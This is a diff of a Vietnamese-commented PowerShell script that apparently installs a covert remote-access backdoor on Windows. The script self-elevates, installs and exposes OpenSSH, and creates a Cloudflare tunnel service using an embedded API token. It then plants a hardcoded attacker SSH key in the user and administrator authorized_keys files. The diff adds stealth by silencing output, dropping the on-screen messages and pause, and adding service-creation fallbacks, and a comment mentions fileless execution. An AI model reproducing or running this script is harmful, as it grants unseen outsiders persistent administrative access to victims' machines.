@@ -4,15 +4,8 @@
 
 # Kiem tra quyen Administrator
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-   
-    
     if ($MyInvocation.MyCommand.Path) {
-        
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
-    }
-    else {
-       
-        Start-Sleep -Seconds 10
     }
     exit
 }
@@ -23,8 +16,6 @@ $OutputEncoding = [System.Text.Encoding]::UTF8
 
 # Bắt lỗi toàn cục
 trap {
-
-    Start-Sleep -Seconds 10
     exit 1
 }
 $ErrorActionPreference = "Stop"
@@ -44,43 +35,42 @@ $SshPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMk83rs0xpy8XOhogglSmppmkYe
 
 # =========================================================================
 
-
 $SshdFound = $false
 
 if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
-  
     $SshdFound = $true
 }
-elseif (Test-Path "$env:ProgramFiles\OpenSSH-Win64\install-sshd.ps1") {
-  
-    $OpenSshDir = "$env:ProgramFiles\OpenSSH-Win64"
-    Push-Location $OpenSshDir
+else {
     try {
-        & powershell.exe -ExecutionPolicy Bypass -File "$OpenSshDir\install-sshd.ps1" | Out-Null
-    } finally {
-        Pop-Location
+        if (Get-Command Add-WindowsCapability -ErrorAction SilentlyContinue) {
+            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null
+        }
+    } catch {}
+
+    if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
+        $SshdFound = $true
     }
-    $SshdFound = $true
-}
-elseif (Get-Command sshd -ErrorAction SilentlyContinue) {
-    
-    $SshdFound = $true
-}
-elseif (Test-Path "C:\Windows\System32\OpenSSH\sshd.exe") {
-    
-    $SshdFound = $true
+    elseif (Test-Path "$env:ProgramFiles\OpenSSH-Win64\install-sshd.ps1") {
+        $OpenSshDir = "$env:ProgramFiles\OpenSSH-Win64"
+        Push-Location $OpenSshDir
+        try {
+            & powershell.exe -ExecutionPolicy Bypass -File "$OpenSshDir\install-sshd.ps1" | Out-Null
+        } finally {
+            Pop-Location
+        }
+        if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
+            $SshdFound = $true
+        }
+    }
 }
 
 if (-not $SshdFound) {
-   
     $ZipPath = "$env:TEMP\OpenSSH-Win64.zip"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip" -OutFile $ZipPath -UseBasicParsing
     
-   
     Expand-Archive -Path $ZipPath -DestinationPath $env:ProgramFiles -Force
     $OpenSshDir = "$env:ProgramFiles\OpenSSH-Win64"
-    
     
     Push-Location $OpenSshDir
     try {
@@ -95,7 +85,6 @@ if (-not $SshdFound) {
         $retry++
     }
 
-   
     $HostKeyDir = "$env:ProgramData\ssh"
     if (Test-Path $HostKeyDir) {
         $keys = Get-ChildItem -Path $HostKeyDir -Filter "*_key"
@@ -110,11 +99,9 @@ if (-not $SshdFound) {
     }
     Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
     
-  
     if (!(Test-Path "HKLM:\SOFTWARE\OpenSSH")) { New-Item -Path "HKLM:\SOFTWARE\OpenSSH" -Force -ErrorAction SilentlyContinue | Out-Null }
     New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
 }
-
 
 if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
     Start-Service sshd -ErrorAction SilentlyContinue
@@ -122,17 +109,13 @@ if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
 }
 
 if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
-  
     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
 }
-
-
 
 $Headers = @{
     "Authorization" = "Bearer $CloudflareAPIToken"
     "Content-Type"  = "application/json"
 }
-
 
 try {
     $TunnelsRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel?is_deleted=false&per_page=100" -Method Get -Headers $Headers
@@ -158,13 +141,6 @@ while ($ExistingTunnels -contains $TunnelName) {
     $i++
 }
 
-if ($TunnelName -ne $InputName) {
-    Write-Host "-> Tên [$InputName] từ whoami đã tồn tại, tự động đổi thành: $TunnelName" -ForegroundColor Yellow
-}
-else {
-    Write-Host "-> Tự động đặt tên Tunnel theo whoami: $TunnelName" -ForegroundColor Green
-}
-
 # Tao Secret 
 $bytes = New-Object byte[] 32
 $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
@@ -182,11 +158,9 @@ $TunnelBody = @{
 try {
     $TunnelRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel" -Method Post -Headers $Headers -Body $TunnelBody
     $TunnelId = $TunnelRes.result.id
-  
 }
 catch {
-  
-    exit
+    exit 1
 }
 
 # Lay Token Tunnel
@@ -196,8 +170,7 @@ try {
     $TunnelToken = $TokenRes.result
 }
 catch {
-    
-    exit
+    exit 1
 }
 
 # [2.3.1] Cau hinh Tunnel Route 
@@ -218,12 +191,10 @@ $ConfigBody = @{
 
 try {
     Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel/$TunnelId/configurations" -Method Put -Headers $Headers -Body $ConfigBody | Out-Null
-   
 }
+catch {}
 
-   
-
-# [2.3.2] Tao CNAME DNS 
+# [2.3.2] Tao hoac Cap nhat CNAME DNS 
 
 $DnsBody = @{
     type    = "CNAME"
@@ -233,14 +204,15 @@ $DnsBody = @{
 } | ConvertTo-Json
 
 try {
-    Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/zones/$CloudflareZoneId/dns_records" -Method Post -Headers $Headers -Body $DnsBody | Out-Null
-  
+    $ExistingDns = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/zones/$CloudflareZoneId/dns_records?name=$TunnelName.$BaseDomain" -Method Get -Headers $Headers
+    if ($ExistingDns.result -and $ExistingDns.result.Count -gt 0) {
+        $RecordId = $ExistingDns.result[0].id
+        Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/zones/$CloudflareZoneId/dns_records/$RecordId" -Method Put -Headers $Headers -Body $DnsBody | Out-Null
+    } else {
+        Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/zones/$CloudflareZoneId/dns_records" -Method Post -Headers $Headers -Body $DnsBody | Out-Null
+    }
 }
-catch {
-    
-}
-
-
+catch {}
 
 $CloudflaredDir = "$env:ProgramFiles\cloudflared"
 $CloudflaredPath = "$CloudflaredDir\cloudflared.exe"
@@ -258,15 +230,13 @@ if (Test-Path $CloudflaredPath) {
 }
 
 if ($FoundCloudflared) {
-    
     if (!(Test-Path $CloudflaredDir)) {
         New-Item -ItemType Directory -Force -Path $CloudflaredDir | Out-Null
     }
     if ($FoundCloudflared -ne $CloudflaredPath) {
-        Copy-Item -Path $FoundCloudflared -Destination $CloudflaredPath -Force
+        Copy-Item -Path $FoundCloudflared -Destination $CloudflaredPath -Force | Out-Null
     }
 } else {
-   
     if (!(Test-Path $CloudflaredDir)) {
         New-Item -ItemType Directory -Force -Path $CloudflaredDir | Out-Null
     }
@@ -276,8 +246,8 @@ if ($FoundCloudflared) {
 
 # 2. Dung service cu & xoa dang ky service cu
 
-Get-Service -Name "*cloudflared*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
-Get-Process -Name "cloudflared" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Service -Name "*cloudflared*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue | Out-Null
+Get-Process -Name "cloudflared" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
 
 if (Test-Path $CloudflaredPath) {
     try { & $CloudflaredPath service uninstall *>&1 | Out-Null } catch {}
@@ -287,24 +257,30 @@ try { & sc.exe delete cloudflared *>&1 | Out-Null } catch {}
 try { & sc.exe stop "Cloudflare Agent" *>&1 | Out-Null } catch {}
 try { & sc.exe delete "Cloudflare Agent" *>&1 | Out-Null } catch {}
 
-Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application\Cloudflared" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application\Cloudflared" -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
 
 Start-Sleep -Seconds 2
 
 # 3. Cai dat va chay service voi Token moi
 
-& $CloudflaredPath service install $TunnelToken
+$installSuccess = $false
+try {
+    & $CloudflaredPath service install $TunnelToken *>&1 | Out-Null
+    $installSuccess = $true
+} catch {}
+
+if (-not $installSuccess -or -not (Get-Service -Name "cloudflared" -ErrorAction SilentlyContinue)) {
+    try {
+        & sc.exe create cloudflared binPath= "\"$CloudflaredPath\" service run --token $TunnelToken" start= auto *>&1 | Out-Null
+        & sc.exe config cloudflared binPath= "\"$CloudflaredPath\" service run --token $TunnelToken" start= auto *>&1 | Out-Null
+    } catch {}
+}
 
 Start-Sleep -Seconds 2
 if (Get-Service -Name "cloudflared" -ErrorAction SilentlyContinue) {
-    Start-Service -Name "cloudflared" -ErrorAction SilentlyContinue
-    Set-Service -Name "cloudflared" -StartupType 'Automatic' -ErrorAction SilentlyContinue
- 
-} else {
-   
+    Start-Service -Name "cloudflared" -ErrorAction SilentlyContinue | Out-Null
+    Set-Service -Name "cloudflared" -StartupType 'Automatic' -ErrorAction SilentlyContinue | Out-Null
 }
-
-
 
 try {
     $WhoAmI = (whoami).Trim()
@@ -315,7 +291,7 @@ catch {
     $WhoAmI = "$env:USERDOMAIN\$env:USERNAME"
 }
 
-
+$UserSid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
 
 $SshDir = "$env:USERPROFILE\.ssh"
 if (!(Test-Path $SshDir)) {
@@ -325,17 +301,14 @@ if (!(Test-Path $SshDir)) {
 $AuthorizedKeysPath = "$SshDir\authorized_keys"
 
 if (-not (Test-Path $AuthorizedKeysPath) -or ((Get-Content $AuthorizedKeysPath) -notcontains $SshPublicKey)) {
-    Add-Content -Path $AuthorizedKeysPath -Value $SshPublicKey
+    Add-Content -Path $AuthorizedKeysPath -Value $SshPublicKey | Out-Null
 }
 
-# Cấp quyền cho Standard user
 icacls.exe $AuthorizedKeysPath /inheritance:r | Out-Null
-$UserPermission = "${CurrentUserName}:(R,W)"
-icacls.exe $AuthorizedKeysPath /grant $UserPermission | Out-Null
+icacls.exe $AuthorizedKeysPath /grant "*$UserSid:(F)" | Out-Null
 icacls.exe $AuthorizedKeysPath /grant "*S-1-5-18:(F)" | Out-Null 
 
 if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-   
     $AdminSshDir = "$env:ProgramData\ssh"
     if (!(Test-Path $AdminSshDir)) { 
         New-Item -ItemType Directory -Force -Path $AdminSshDir | Out-Null
@@ -343,21 +316,12 @@ if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     $AdminKeyPath = "$AdminSshDir\administrators_authorized_keys"
     
     if (-not (Test-Path $AdminKeyPath) -or ((Get-Content $AdminKeyPath) -notcontains $SshPublicKey)) {
-        Add-Content -Path $AdminKeyPath -Value $SshPublicKey
+        Add-Content -Path $AdminKeyPath -Value $SshPublicKey | Out-Null
     }
 
     icacls.exe $AdminKeyPath /inheritance:r | Out-Null
     icacls.exe $AdminKeyPath /grant "*S-1-5-18:(F)" | Out-Null 
     icacls.exe $AdminKeyPath /grant "*S-1-5-32-544:(F)" | Out-Null 
     
-    Restart-Service sshd -ErrorAction SilentlyContinue
-}
-
-
-try {
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-}
-catch {
-    # Fileless execution hoac console khong the doc phim
-    Start-Sleep -Seconds 10
+    Restart-Service sshd -ErrorAction SilentlyContinue | Out-Null
 }
